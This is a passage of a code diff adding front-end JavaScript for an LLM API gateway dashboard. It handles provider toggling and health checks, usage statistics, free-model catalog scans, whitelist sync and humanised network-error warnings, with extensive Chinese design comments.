+      if (!r.ok) return toast('删除失败', r.error || '未知错误', 'err')
+      toast('已删除', label + ' 已移出路由池')
+      refresh()
+    }, '删除')
+}
+async function toggleOne(id){
+  const r = await api('/api/providers/'+id+'/toggle', { method:'POST', body:'{}' })
+  // 必须核对服务端真正返回的 enabled, 不能只看有没有抛错 —— 否则接口失败时也会提示"已启用"
+  if (!r.ok || typeof r.enabled !== 'boolean') { toast('切换失败', r.error || '服务端未返回状态', 'err'); refresh(); return }
+  toast(r.enabled ? '已启用' : '已停用', r.enabled ? '该家已加入 auto 路由' : '该家不再参与 auto 路由', r.enabled ? 'ok' : 'warn')
+  refresh()
+}
+// ⚠ 这里曾有一个用原生 prompt() 一次性覆盖全部 Key 的 editKeys()。
+// 已被逐 Key 弹层（openKeysModal）取代 —— 整份覆盖会连冷却与成败统计一起重置，
+// 而逐 Key 弹层能看见每把 Key 的健康度、也不存在"粘贴时漏掉一行就把某把 Key 弄丢"的风险。
+async function unblock(id, model){
+  const r = await api(`/api/providers/${id}/unblock`, { method:'POST', headers:{'content-type':'application/json'}, body:JSON.stringify({ model: model || undefined }) })
+  if (r.ok) { toast('已解除', model ? model + ' 已放回可用池' : '全部模型已放回可用池'); refresh() } else toast('解除失败', r.error, 'err')
+}
+async function testOne(id){
+  toast('正在测试…', '发送一条最小请求', 'ok', 2500)
+  const r = await api('/api/providers/'+id+'/test', { method:'POST', headers:{'content-type':'application/json'}, body:'{}' })
+  if (r.ok) toast('调用成功', (r.detail||'').slice(0,180))
+  else toast('调用失败' + (r.blocked ? '（已拉黑）' : ''), (r.detail || r.error || JSON.stringify(r)).slice(0,300), 'err', 8000)
+  refresh()
+}
+async function checkOne(id){
+  const p = LAST.find(x => x.id === id); if(!p) return
+  const n = (p.models && p.models.length ? p.models : [p.model]).filter(Boolean).length
+  toast('正在体检…', `逐个测试 ${p.label||p.name} 的 ${n} 个模型`, 'ok', 3000)
+  const r = await api(`/api/providers/${id}/check`, { method:'POST', headers:{'content-type':'application/json'}, body:'{}' })
+  if(!r || !r.ok){ toast('体检失败', (r && r.error) || '未知错误', 'err'); return }
+  const bad = (r.results||[]).filter(x => !x.ok)
+  if(!bad.length) toast('体检通过', `${r.results.length} 个模型全部可用`, 'ok')
+  else toast(`发现 ${bad.length} 个问题模型`, bad.map(x => `${x.model}: ${x.blocked ? '已转收费/下架，已拉黑' : (x.status ? 'HTTP '+x.status : (x.error||'不可用'))}`).join('\n'), 'err', 12000)
+  refresh()
+}
+
+async function loadStats(){
+  let s; try { s = await api('/api/stats') } catch { return }
+  // Token 智能单位换算: 自动从 k 跳到 M 跳到 B, 避免"几万 k"看着像没换算。
+  // ⚠ **数字部分限长 4 字符**（2026-10-04 修折行）：stat 格内宽只有 67px，21px 字号下
+  //   "999.9" 单独就 61px，再拼上单位必然折行 —— 实测 "≈ 41.0 k"(75px) 会把 "k" 挤到第二行，
+  //   六格里唯独这一格变两行，很扎眼。现规则：≥100 取整（"999k"）、<100 保留 1 位小数（"41.0k"）。
+  //   单位单独用 <small> 渲染，与旁边「3 次」「7.4时」完全同构 —— 整串最宽 ~55px，任何量级都不折行。
+  //   ⚠ 别再把 "≈" 塞回大数字里：那会 +14px 立刻越界。近似语义放 title。
+  const fmtTokParts = (n) => {
+    const v = Number(n) || 0
+    if (v < 1e3) return [String(Math.round(v)), '']
+    const pick = (x, unit) => [x < 100 ? x.toFixed(1) : String(Math.round(x)), unit]
+    if (v < 1e6) return pick(v / 1e3, 'k')
+    if (v < 1e9) return pick(v / 1e6, 'M')
+    return pick(v / 1e9, 'B')
+  }
+  const tokParts = fmtTokParts(s.tokens)
+  const tokHtml = tokParts[0] + (tokParts[1] ? `<small>${tokParts[1]}</small>` : '')
+  const tokTip = `≈ ${Math.round(Number(s.tokens) || 0).toLocaleString()} tokens（按上游返回的 usage 累计）`
+  // 时间格只显示 HH:MM（2026-09-25）：6 格并排时每格只有 ~95px，「9月25日 13:13」会折成两三行。
+  // 完整日期挂 title —— 跨天时 hover 一眼能看到。
+  const hm = (iso) => {
+    const d = new Date(iso)
+    return isNaN(d.getTime()) ? '—' : `${String(d.getHours()).padStart(2, '0')}:${String(d.getMinutes()).padStart(2, '0')}`
+  }
+  // 顶部「失败」= 用户最终收到错误的请求数; 副行「候选失败」= 链上试错失败、但被后续候选救回的次数。
+  // 口径不同必须都露出来: 只显示"失败 0"会被当成统计坏了(实测用户就是这么问的)。
+  const cf = s.candidateFail || 0
+  const cfTxt = cf > 0 ? `<b>${cf}</b>` : String(cf)
+  // 「时间」格的主数字改成**运行时长**（2026-09-25）：原来这格是两行小字（目录/启动），
+  // 和旁边 5 格的 22px 大数字形态对不上，6 格并排时一眼就看出"这一格没对齐"。
+  // 信息一点没丢 —— 启动时刻进副行，白名单同步时刻本来就在「免费模型目录」的标题里。
+  const upMs = Math.max(0, Date.now() - new Date(s.startedAt).getTime())
+  const upTxt = upMs < 3600e3
+    ? `${Math.max(1, Math.round(upMs / 60000))}<small>分</small>`
+    : upMs < 86400e3 ? `${(upMs / 3600e3).toFixed(1)}<small>时</small>` : `${(upMs / 86400e3).toFixed(1)}<small>天</small>`
+  const cell = ([k, v, cls, tip]) => `<div class="stat${cls === 'wide' ? ' wide' : ''}"><div class="k">${k}</div><div class="v ${cls === 'wide' ? 'xs' : cls}"${tip ? ` title="${esc(tip)}"` : ''}>${v}</div></div>`
+  // 进程级统计全是 0（网关刚启动、还没接过调用）时合并成一格把话说清。
+  // 以前是四个 0 并排铺开，而**同一屏**的供应商卡片显示的是**全期**数字（成功 367 / 失败 30）——
+  // 两个口径摆在一起，用户看到的是"网关坏了"，实际只是"这个进程刚起来"。
+  const idle = !s.requests && !s.success && !s.fail && !s.fallbacks
+  $('statsbar').innerHTML = (idle
+    ? [
+        ['本次启动', `暂无请求 · ${fmtShort(s.startedAt)} 启动后还没接过调用`, 'wide'],
+        ['Token', tokHtml, '', tokTip],
+        ['运行', `${upTxt}<span class="sub" title="目录更新 ${fmtShort(s.catalog_updated_at)}">目录 ${hm(s.catalog_updated_at)}</span>`, ''],
+      ]
+    : [
+        ['请求', `${s.requests} <small>次</small>`, ''],
+        ['成功', s.success, 'ok'],
+        // 副行只在真的发生过链上试错时才出现（2026-09-25）：cf=0 时它就是"候选失败 0 已回退"
+        // 这句废话，还让「失败」格比其他 5 格高出一截，6 格看着不齐。
+        // ⚠ 措辞再收紧（2026-10-04）：原文"候选失败 1 已回退"在 67px 内宽下折成两行、还把
+        //   "已回退"从中间断开。改成"已回退 1 次"（~58px，一行放下），语义不变、与页面其它地方
+        //   的「回退」用词一致（见"失败自动处理：冷却 / 回退 / 拉黑"）。
+        ['失败', `${s.fail}${cf > 0 ? `<span class="sub" title="链上有 ${cf} 个候选试错失败，已被后续候选回退救回，用户最终未收到错误">已回退 ${cfTxt} 次</span>` : ''}`, s.fail > 0 ? 'err' : ''],
+        ['自动切换', s.fallbacks, s.fallbacks > 0 ? 'warn' : ''],
+        ['Token', tokHtml, '', tokTip],
+        ['运行', `${upTxt}<span class="sub" title="启动 ${fmtShort(s.startedAt)} · 目录更新 ${fmtShort(s.catalog_updated_at)}">启动 ${hm(s.startedAt)}</span>`, ''],
+      ]
+  ).map(cell).join('')
+}
+
+// 目录刷新是"服务端异步扫描 + 扫完才写盘"，只等固定 15 秒会卡在旧结果上
+// (实测: 扫描耗时超过 15 秒时，页面永远停在上一轮的状态) —— 改成轮询到 updated_at 真的变了为止。
+async function currentCatalogAt(){
+  try { const r = await api('/api/catalog'); return (r && r.catalog && r.catalog.updated_at) || '' } catch { return '' }
+}
+async function waitCatalogRefresh(prevAt, tries = 30){
+  for (let i = 0; i < tries; i++){
+    await new Promise((r) => setTimeout(r, 3000))
+    const r = await api('/api/catalog')
+    const cat = r && r.catalog
+    if (cat && cat.updated_at && cat.updated_at !== prevAt){
+      renderCatalog(cat); await loadChanges(); refresh(); loadStats()
+      return true
+    }
+  }
+  await loadCatalogOnce(); await loadChanges(); refresh(); loadStats()
+  toast('扫描用时较长', '可稍后刷新页面查看最新结果', 'err', 6000)
+  return false
+}
+async function refreshCatalog(){
+  $('catalog').innerHTML = '<span class="empty"><span class="spin"></span> 扫描中，约需十几秒…</span>'
+  const before = await currentCatalogAt()
+  await api('/api/catalog?refresh=1')
+  toast('已开始扫描','完成后自动刷新')
+  await waitCatalogRefresh(before)
+}
+async function syncWhitelist(){
+  const b = $('wlsync'); if (b) b.disabled = true
+  toast('同步白名单中', '正在从上游拉取最新免费名单…')
+  const before = await currentCatalogAt()
+  let r; try { r = await api('/api/whitelist/sync', { method:'POST', headers:{'content-type':'application/json'}, body:'{}' }) } catch { r = { ok:false } }
+  if (b) b.disabled = false
+  if (r && r.ok) {
+    let srcTxt = ''
+    // 2026-09-25 移除 mnfst（自 2026-08-21 停更）—— 这里的映射也一并去掉，不留死条目。
+    const SRC_NAME = { openrouter: 'OpenRouter', modelsdev: 'models.dev', freellm: 'freellm' }
+    if (r.synced.sources) srcTxt = ' · ' + Object.entries(r.synced.sources).map(([k, v]) => `${SRC_NAME[k] || k} ${String(v).startsWith('失败') ? '✗' : v}`).join('，')
+    toast('白名单已更新', `共 ${r.synced.hosts} 家 · 最新名单日期 ${r.synced.list_date || '—'}${srcTxt}，目录将自动重扫`, 'ok', 6000)
+    await waitCatalogRefresh(before)
+  } else if (r && r.busy) {
+    // ⚠ "正在同步"不是"同步失败"（2026-09-25 修）：网关启动时会自动跑一轮同步（models.dev 的
+    //   4.7MB 要 1–3 分钟），用户在这期间点按钮必然撞上服务端的 _wlSyncing 闸门。
+    //   以前这里一律弹红色「同步失败 / 网络不通」，把"正在忙"报成了"源挂了"—— 与后端刚修的口径对齐。
+    toast('同步正在进行中', r.error || '稍后刷新即可', 'warn', 6000)
+  } else toast('同步失败', r && r.error || '网络不通，已沿用本地缓存名单', 'err', 6000)
+}
+// ── 限时活动巡检: 抓厂商官方公告页, 自动判定"限时免费"活动是否还在 ──
+// 白名单源覆盖不到活动型免费(B.AI 0 Credits 等), 所以单独盯公告页; 活动一结束立即移出免费池
+async function loadPromo(){
+  try { const r = await api('/api/promo'); if (r && r.promo) renderPromo(r.promo) } catch {}
+}
+// ── 限时活动巡检的**告警出口** ──
+// 巡检本身照常每 6 小时自动跑（启动 10s 后首跑），结论（活动开始 / 结束 / 移出池）直接写进
+// free_catalog 的变动记录，在「免费池变动」里就能看到 —— 所以不再单开一个展示模块
+// （用户问过"结果也会在免费池变动里展示，真的有必要多这个显示模块吗"，答案是不必要）。
+// 这里只保留**需要人介入**的那一类：巡检自身失效（公告页抓不到 / 页面改版导致一个模型都匹配不上）。
+// 这类异常最阴险 —— HTTP 200 但结论永远不再更新，不提示就等于防线静默失效。
+async function loadPromo(){
+  try { const r = await api('/api/promo'); if (r && r.promo) renderPromo(r.promo) } catch {}
+}
+// 巡检异常里也铺着上游原始报文（2026-09-26）：`公告页抓取失败: connect ECONNREFUSED <代理地址>`
+// —— 和目录卡、使用记录是**同一个原因**，这是整页第三处重复。就地翻译成同一句人话，
+// 让"代理没开"在哪儿读起来都是同一件事，而不是三处各写各的。
+// ⚠ 2026-10-04 补齐常见网络异常：原来只翻 ECONNREFUSED 一条，于是
+//   "Client network socket disconnected before secure TLS connection was established"
+//   这种 60+ 字符的原始报文被原样怼给用户看（实测 bai / sensenova 各占一大块）。
+const humanizeErr = (s) => String(s || '未知原因')
+  // 上游报文自带 "公告页抓取失败: " 前缀，而调用点又会写一遍「公告页抓取失败：」——
+  // 不剥掉就会读成"公告页抓取失败：公告页抓取失败: TLS 连接中断"（2026-10-04 实测踩到）。
+  .replace(/^\s*公告页抓取失败\s*[:：]\s*/, '')
+  // 端口从报文里取（就是用户配的那个），不写死 —— 写死的话别人的代理端口一变，这句就永远不命中。
+  .replace(/connect ECONNREFUSED ((?:127\.0\.0\.1|::1|localhost):\d+)/g, '代理未启动（$1）')
+  .replace(/Client network socket disconnected before secure TLS connection was established/gi, 'TLS 连接中断')
+  .replace(/socket hang up/gi, '连接被中断')
+  .replace(/ETIMEDOUT|timeout of \d+ms exceeded/gi, '连接超时')
+  .replace(/getaddrinfo ENOTFOUND [^\s]*/gi, '域名解析失败')
+  .replace(/fetch failed/gi, '请求失败')
+// 网络类原因（匹配 humanizeErr 的输出，也兼容未命中翻译的原始报文）。
+// 用途：给告警配**对的**行动建议 —— 网络问题不该让人去改公告页地址（改了也没用）。
+const NET_ERR_RE = /代理未启动|TLS|连接被中断|连接超时|域名解析失败|请求失败|网络|ECONNREFUSED|ECONNRESET|ETIMEDOUT|ENOTFOUND|EAI_AGAIN|socket hang up|fetch failed|timeout/i
+function renderPromo(p){
+  const box = $('promowarn'); if (!box) return
+  const bad = ((p && p.health) || []).filter((h) => h.failCount > 0)
+  const gap = (p && p.unwatched) || []
+  if (!bad.length && !gap.length) { box.innerHTML = ''; return syncChgCard() }
+  // ⚠ 按**根因分组**（2026-10-04）：实测 bai 与 sensenova 是**同一秒、同一句报错**（TLS 中断），
+  //   却各占一个三行橙块 —— 同一件事重复两遍，把「免费池变动」首屏 ~180px 全吃掉了。
+  //   现在同因合并成一行，并把那句固定解释（"公告页可能已改版…"）从每块里提出来只写一次。
+  const groups = new Map()
+  for (const h of bad) {
+    const r = humanizeErr(h.lastError)
+    if (!groups.has(r)) groups.set(r, [])
+    groups.get(r).push(h)
+  }
+  const warn = [...groups].map(([reason, hs]) => {
+    const worst = Math.max(...hs.map((h) => h.failCount || 1))
+    // 连续 ≥3 次才算"持续失效、要人看一眼"；1~2 次多为网络抖动，下轮自会重试 —— 降噪但**不隐藏**
+    // （这类告警"不显示 = 防线静默失效"，所以只降低音量、不删）。soft 用左侧细线而非整块底色，
+    // 避免读成"禁用/占位"的灰块（见 .warnnote.soft 注释）。
+    const persistent = worst >= 3
+    // 行动建议必须按**原因分型**（2026-10-04 修）：原来不论什么原因，连续 ≥3 次一律说
+    // "公告页可能已改版或地址失效，请检查地址" —— 而 TLS 中断 / 连接超时 / 代理未启动 是
+    // **纯网络**问题，让用户去改公告页地址是误导（他改了也没用，白折腾一轮）。网络类只说网络。
+    const advice = NET_ERR_RE.test(reason)
+      ? (persistent ? `，网络或代理持续不通，请检查代理${PROXY_ADDR ? `（${PROXY_ADDR}）` : ''}与网络。` : '，多为网络波动，下轮自动重试。')
+      : (persistent ? '，公告页可能已改版或地址失效，请检查地址。' : '，多为临时抖动，下轮自动重试。')
+    return `<div class="warnnote${persistent ? '' : ' soft'}">`
+      + `<b>巡检异常</b> · ${hs.map((h) => esc(h.pname)).join('、')} 公告页抓取失败：${esc(reason)}`
+      + `<span class="d">限时活动的免费 / 收费判定本轮未刷新 · 连续 ${worst} 次${advice}</span></div>`
+  }).join('')
+  const gapNote = gap.length ? '<div class="warnnote soft">仅人工维护 · ' + gap.map((u) => esc(u.label)).join('、')
+    + ' 的限时活动尚未纳入自动巡检，结束时间只能靠人工确认，容易漏掉。</div>' : ''
+  box.innerHTML = warn + gapNote
+  syncChgCard()
+}
+async function loadCatalogOnce(){
+  const r = await api('/api/catalog')
+  if (r && r.catalog) renderCatalog(r.catalog)
+}
+let CAT = null
+const CAT_OPEN = new Set()  // 已展开完整目录的厂商下标
+// 厂商 logo：和供应商列表共用同一份映射（assets/logos/）。加载失败直接移除，不留破图。
+const vlogoHtml = (p) => {
+  const f = VENDOR_LOGOS[p.name]
+  return f ? `<img class="vlogo" src="/assets/logos/${esc(f)}" alt="" loading="lazy" onerror="this.remove()">` : ''
+}
+// 每家默认铺的 chip 数。12 → 6（2026-09-25）：实测目录卡里 gemini(173px) 和 openrouter(259px)
+// 两家就占了 catalog 的 54%，因为各铺了 12 个 chip 撑成两行。6 个基本是一行的量，
+// 想看全的照样能点「+N 个」展开 —— 不是把功能藏掉，是别让两家把整卡撑长。
+const CAT_CAP = 3
+// 目录拉取失败的人话结论：返回 [行内短文案, 卡头完整文案]。
+// ⚠ 代理没开要**单独报**（2026-09-26）：本机代理一关，5 家的报错原文都是
+// 'connect ECONNREFUSED <代理地址>'，但它既不匹配 ENOTFOUND/EAI_AGAIN 也不匹配
+// 'fetch failed'，于是统一降级成"拉取失败"——用户看到的是网关坏了，实际只是自己的梯子没开。
+// 这条必须点名到端口，才是可行动的（端口取自报文本身，不是写死的）。
+function failBrief(e){
+  const s = String(e)
+  // 环回地址被拒 = 本机代理没开。端口从报文里取（就是用户配的那个），不写死。
+  const refused = s.match(/ECONNREFUSED ((?:127\.0\.0\.1|::1|localhost):\d+)/)
+  if (refused) return ['代理未启动', `代理未启动（${refused[1]}）`]
+  if (/offline|unavailable/i.test(s)) return ['上游端点已下线', '上游端点已下线']
+  if (/HTTP 5\d\d/.test(s)) return ['上游服务故障', '上游服务故障']
+  if (/HTTP 4\d\d/.test(s)) return ['上游拒绝请求', '上游拒绝请求']
+  if (/timeout|ETIMEDOUT/i.test(s)) return ['请求超时', '请求超时']
+  if (/ENOTFOUND|EAI_AGAIN|ECONNREFUSED|ECONNRESET|fetch failed/i.test(s)) return ['连不上（网络或代理）', '连不上（网络或代理）']
+  return ['拉取失败', '拉取失败']
+}
+function renderCatalog(cat){
+  if (!cat || !cat.providers) return
+  CAT = cat
+  $('catmeta').textContent = `· 扫描 ${fmtShort(cat.updated_at)}`
+  const el = $('catalog'); el.innerHTML = ''
+  // 同因失败合并成卡头一条（2026-09-26）：代理没开时 5 家的行内是**同一句** 24 字
+  // 「代理未启动（<代理地址>）· 5 分钟后自动补扫」，重复 5 遍 → 整卡是一堵重复文字墙，
+  // 而真正要看的"哪几家"反被淹掉。同一原因在卡头说一次，行内只留 4 个字的短状态。
+  const fails = cat.providers.filter((p) => p.error).map((p) => failBrief(p.error)[1])
+  const tally = {}
+  fails.forEach((f) => { tally[f] = (tally[f] || 0) + 1 })
+  const topFail = Object.entries(tally).sort((a, b) => b[1] - a[1])[0]
+  if (topFail && topFail[1] >= 2) {
+    const b = document.createElement('div'); b.className = 'warnnote'
+    b.innerHTML = `<b>${topFail[1]} 家暂无法扫描</b>：${esc(topFail[0])} · 5 分钟后自动补扫，也可点「重新扫描」立即重试`
+    el.appendChild(b)
+  }
+  cat.providers.forEach((p, i) => {
+    const d = document.createElement('div'); d.className = 'catprov'
+    if (p.error) {
+      // 拉取失败的显示（2026-09-25 视觉重做）：原来把上游原始报文截 70 字直接铺在界面上，
+      // 页面里就出现 `HTTP 503 {"error":{"message":"The endpoint is offline for now and will…`
+      // 这种 JSON 碎片 —— 又长又丑，还看不懂。现在只给一句人话结论，原始报文挂 title 供排查。
+      const e = String(p.error)
+      // 人话结论（含代理单独点名）统一走 failBrief —— 卡头的同因合并用的是同一个函数，
+      // 免得"行内说 A、卡头说 B"两套口径。
+      const brief = failBrief(p.error)[0]
+      // 失败态收成**一行**（2026-09-26 第五轮）：原来"厂商名一行 + 状态一行"占 57px，
+      // 7 家里 6 家失败时整卡就是一叠灰块，视觉上像"加载失败的骨架屏"。
+      // 状态挂在右侧槽位 —— 和成功态的「4/8 可用」是同一个位置，读法一致：右边永远是"这家现在怎么样"。
+      // 行内只留短状态（2026-09-26）："5 分钟后自动补扫"交给卡头的同因提示说一次，别 5 行重复 5 遍。
+      d.innerHTML = `<div class="hd">${vlogoHtml(p)}<span class="nm" title="${esc(p.label)}">${esc(p.label)}</span><span class="spacer"></span>`
+        + `<span class="cnt" style="font-size:var(--fs-2)" title="${esc(e)}｜多为瞬时网络中断（代理切节点/断网），5 分钟后会自动补扫；也可点「重新扫描」立即重试"><span style="color:var(--text);font-weight:500">${esc(brief)}</span></span></div>`
+      el.appendChild(d); return
+    }
+    // 排序：推荐/限时排前面，已失效的沉底 —— 让"能用的"先被看见
+    const rank = (m) => m.dead ? 3 : (m.promo && m.promo.expired) ? 3 : m.rec ? 0 : m.promo ? 1 : 2
+    const ordered = [...p.models].sort((a, b) => rank(a) - rank(b))
+    const open = CAT_OPEN.has(i)
+    const shown = open ? ordered : ordered.slice(0, CAT_CAP)
+    const rest = ordered.length - shown.length
+    // 「推荐」的呈现（2026-09-26 第五轮）：不再用 ⭐ 前缀，改挂 .chip.rec（字重 500 + ink 字色）。
+    // 上一版的条件是"显示的 chip 全是推荐时才不显示 ⭐"，但排序把推荐项全排在前面，
+    // 默认这 6 个本来就几乎全是推荐 → 条件基本不成立 → 一屏十来个黄星。详见 CSS 里 .chip.rec 的注释。
+    const mpre = commonModelPrefix(p.models.map((x) => x.id))
+    // 表行（2026-10-17）：一行一个模型。状态只写**非默认**的那一种 ——
+    // 「长期免费」是常态，写满一列等于没有信息；限时 / 失效才是需要眼睛停一下的。
+    const rows = shown.map((m) => {
+      const short = mpre && m.id.startsWith(mpre) ? m.id.slice(mpre.length) : m.id
+      const expired = !!(m.promo && m.promo.expired)
+      let cls = 'mrow', st = ''
+      if (m.dead) { cls += ' dead'; st = m.dead === 'blocked' ? '已失效' : '待确认' }
+      else if (expired) { cls += ' dead'; st = '活动已结束' }
+      else if (m.promo) { cls += ' promo'; st = m.promo.until ? '限时至 ' + String(m.promo.until).slice(5) : '限时免费' }
+      else if (m.rec) cls += ' rec'
+      const tip = (m.promo ? m.promo.note : m.rec ? '推荐 / 长期免费' : '长期免费')
+        + (m.dead ? '｜' + (m.dead_reason || '已失效') : '')
+        + (mpre ? '｜完整名 ' + m.id : '')
+      return `<div class="${cls}" title="${esc(tip)}"><span class="mnm">${esc(short)}</span>`
+        + (st ? `<span class="mst">${esc(st)}</span>` : '') + '</div>'
+    }).join('')
+    const moreRow = rest > 0
+      ? `<div class="mrow more" data-act="expand-cat" data-i="${i}" role="button" tabindex="0">还有 ${rest} 个</div>`
+      : ''
+    const promoCount = p.models.filter((m) => m.promo && !m.promo.expired && !m.dead).length
+    const deadCount = p.models.filter((m) => m.dead).length
+    const liveCount = p.models.length - deadCount
+    const excluded = p.excluded || []
+    const excludedTotal = p.excluded_total || excluded.length
+    const exKey = 'ex-' + i
+    // 这行以前每个厂商都重复一遍"不适合 /chat/completions，不进入 auto"，一屏 7 家就是 7 遍同样的解释。
+    // 解释改挂 title，行内只留"已排除 N 个专用模型" —— 要细节的再点「查看」。
+    const exTip = '这些模型的接口形状不兼容 /chat/completions（嵌入 / 重排 / 审核 / 语音 / OCR / 纯图像或视频生成），接进来只会报错或产生无意义调用，所以自动排除、不进 auto 路由'
+    const exLine = excludedTotal
+      ? (excluded.length
+        ? `<a class="cnt exlink" id="${exKey}-t" data-act="toggle-box" data-key="${esc(exKey)}" data-nolabel="1" role="button" tabindex="0" title="${exTip}">排除 ${excludedTotal}</a>`
+        : `<span class="cnt" title="${exTip}">排除 ${excludedTotal}</span>`)
+      : ''
+    const exBody = excluded.length ? `<div class="exclude-body" id="${exKey}-b" style="display:none">${excluded.map((m) => `<span class="exclude-chip" title="${esc(m.reason || m.kind || '')}">${esc(m.id)} <em>· ${esc(m.kind || '专用')}</em></span>`).join('')}</div>` : ''
+    // 口径（2026-09-26 第八轮）：分子分母必须**同口径** —— 分母 = 该家免费文字对话模型总数（含已失效的）。
+    const hdTip = '该家免费文字对话模型里，可用的 / 全部的。'
+      + (p.total ? `该家上游共可见 ${p.total} 个模型（含付费），只有免费且是文字对话的才进池。` : '')
+      + (deadCount ? `其中 ${deadCount} 个已失效（转收费或下架，已移出池）。` : '')
+      + (mpre ? `下方模型名省略了公共前缀 ${mpre}。` : '')
+      + '只收能输出文字的对话模型 —— 嵌入 / 重排 / 审核 / 语音 / OCR / 纯图像视频生成会被自动排除。'
+    const noModels = !rows
+    d.innerHTML = `<div class="hd">`
+      + vlogoHtml(p)
+      + `<span class="nm" title="${esc(p.label)}">${esc(p.label)}</span>`
+      + `<span class="spacer"></span>`
+      + (noModels
+        ? (p.total === 0
+          // total=0 = 上游 /v1/models 一个模型都没返回。这和"有模型但都不是对话模型"是两件事，
+          // 前者多半是 Key / 接入点问题（sensenova 实测就是这种）。
+          ? `<span class="cnt" title="上游 /v1/models 没有返回任何模型 —— 多为 Key 类型不对 / 账号未开通 / 接入点路径不对，不是模型下架。展开供应商卡可看详情。">上游未返回任何模型</span>`
+          : `<span class="cnt" title="该家可见模型里没有能输出文字的对话模型 —— 嵌入 / 重排 / 审核 / 语音 / OCR / 纯图像视频生成都不进池">未识别出免费文字对话模型</span>`)
+        : `<span class="cnt" title="${esc(hdTip)}"><b>${liveCount}</b>/${p.models.length} 可用${promoCount ? ` · 限时 ${promoCount}` : ''}</span>`)
+      + exLine
+      + (open && p.models.length > CAT_CAP ? `<a class="cnt" data-act="collapse-cat" data-i="${i}" role="button" tabindex="0" style="color:var(--ink);cursor:pointer">收起</a>` : '')
+      + `</div>${noModels ? '' : `<div class="mrows">${rows}${moreRow}</div>`}${exBody}`
+    el.appendChild(d)
+  })
+  restoreOpenBoxes(el)
+}
+function expandCat(i){ CAT_OPEN.add(i); renderCatalog(CAT) }
+function collapseCat(i){ CAT_OPEN.delete(i); renderCatalog(CAT) }
+
+const CHG_LABEL = { added:'新增免费', removed:'移出免费池', promo_start:'限时开始', promo_end:'限时结束', quarantine:'自动隔离', release:'恢复可用', pool_sync:'路由池同步', unblock:'复审解除', blocked:'拉黑', promo:'限时活动', probe_block:'探活拒绝', sweep_block:'体检拉黑', pool_up:'免费变多', pool_down:'免费变少' }
+// ── 使用记录：固定最近 30 条 ────────────────────────────────
+// 刻意**不做筛选 / 搜索 / 加载更多**（用户明确要求"改回之前那样"）：这是"扫一眼最近有没有异常"
+// 的面板，不是日志检索工具。真要定位某一次调用，用请求 ID 走 /api/usage?id=，或直接看
+// usage_log.json —— 日志本身仍保留 2000 条，只是不把检索界面搬到页面上。
+const UG_LIMIT = 30
+async function loadUsage(){
+  let r; try { r = await api('/api/usage?limit=' + UG_LIMIT) } catch { return }
+  const list = (r && r.records) || []
+  const total = (r && r.total) || 0
+  if (!total) { $('usgcard').style.display = 'none'; return }
+  $('usgcard').style.display = 'block'
+  const okN = (r && r.okCount) || 0
+  const failN = (r && r.failCount) || 0
+  // 口径（2026-09-25 修）：这里原来直接把**全期累计**摆出来 —— 877 条里 177 条失败（20%），
+  // 而其中 137 条来自 9-19 一天的调试。每天打开看到"失败 177"，很容易得出"这网关越来越差"
+  // 的结论（实测用户就是这么反应的，但服务端最近 4 天是 0 失败）。
+  // 主信息改成**最近 N 条的成败** —— 那才是"现在好不好"；全期累计降级进括号，不删：
+  // "这家从没成功过"这类判断仍然需要它。
+  const rOk = list.filter((c) => c.ok).length
+  const rFail = list.length - rOk
+  // 累计数字再降一级（2026-09-25）：上一版把它从主信息降成括号，但「失败 177」仍然常驻在卡头，
+  // 而 177 里大多来自 9-19 一天的调试（服务端最近 4 天是 0 失败）—— 天天打开都看到"失败 177"，
+  // 很容易得出"这网关越来越差"。现在卡头只留"最近 N 条"这个**当下**口径，累计挪进 hover：
+  // 需要"这家是不是从没成功过"这类判断时，悬停仍然查得到。
+  const um = $('usgmeta')
+  um.textContent = `最近 ${list.length} 条：成功 ${rOk} · 失败 ${rFail}`
+  um.title = `全部历史累计 ${total} 条：成功 ${okN} / 失败 ${failN}。\n`
+    + `这是网关运行至今的累计值，包含早期调试产生的失败，**不代表当前状态** —— 判断"现在好不好"请看卡头那行"最近 ${list.length} 条"。`
+  // ── 模型分布汇总(2026-10-06) ──
+  // 回答"auto 到底在用什么": 把最近 N 条按 provider/model 聚合成 次数 / 失败数 / 平均耗时。
+  // 实测(2026-10-05)最近 30 条里 26 条是同一个模型 —— 没有这行, 用户只能从一堵几乎一样的
+  // 流水里自己数; 而"哪个模型在领跑、成功率如何"恰恰是他判断 auto 好不好用的直接依据。
+  const agg = new Map()
+  for (const c of list) {
+    const k = `${c.provider}/${c.model}`
+    const a = agg.get(k) || { n: 0, ok: 0, ms: 0, msN: 0 }
+    a.n++; if (c.ok) a.ok++; if (c.ms) { a.ms += c.ms; a.msN++ }
+    agg.set(k, a)
+  }
+  $('usgagg').innerHTML = [...agg.entries()].sort((a, b) => b[1].n - a[1].n).map(([k, a]) => {
+    const bad = a.n - a.ok
+    const avg = a.msN ? Math.round(a.ms / a.msN) : 0
+    return `<span class="ua" title="${esc(k)}：${a.n} 次调用，成功 ${a.ok}，失败 ${bad}${avg ? `，平均 ${fmtMs(avg)}` : ''}">`
+      + `<span class="nm">${esc(k)}</span><span class="n">${a.n} 次</span>`
+      + (bad ? `<span class="bad">${bad} 失败</span>` : '')
+      + (avg ? `<span class="n">均 ${fmtMs(avg)}</span>` : '')
+      + `</span>`
+  }).join('')
+  $('usagelist').innerHTML = list.map((c) => {
+    // 单行三段: 时间 / 成败 / 厂商 模型 (原因)。kpi 只留一个: 总耗时已能代表这一次调用有多快,
+    // 再加首字会让一行尾端挤两个 ms —— 用户原话是"重复了吧"。
+    // reason 的格式是「人话 · 原始报文」（见 server.mjs 的 failReason）。后半段是
+    // `connect ECONNREFUSED <代理地址>` 这类**排查用**的技术细节，整段铺在行里会把
+    // 每条记录撑到 2 行（实测 8 条里 5 条如此），一屏下来就是一段重复的英文报错。
+    // 正文只留人话，原文本来就已经在 tip 里 —— 信息一点没丢。
+    const ri = c.reason ? String(c.reason).indexOf(' · ') : -1
+    const rBrief = ri > 0 ? String(c.reason).slice(0, ri) : c.reason
+    const body = `<b>${esc(c.provider)}</b> <span class="mdl">${esc(c.model)}</span>`
+      + (rBrief ? `<span class="reason">${esc(rBrief)}</span>` : '')
+    const tip = `${fmtTime(c.at)} · ${c.ok ? '成功' : '失败'} · ${c.provider}/${c.model}` + (c.reason ? ` · ${c.reason}` : '')
+    return `
+    <div class="chg">
+      <span class="tm">${fmtTime(c.at)}</span>
+      <span class="tag ${c.ok ? 'use_ok' : 'use_fail'}">${c.ok ? '成功' : '失败'}</span>
+      <span class="bd" title="${esc(tip)}">${body}</span>
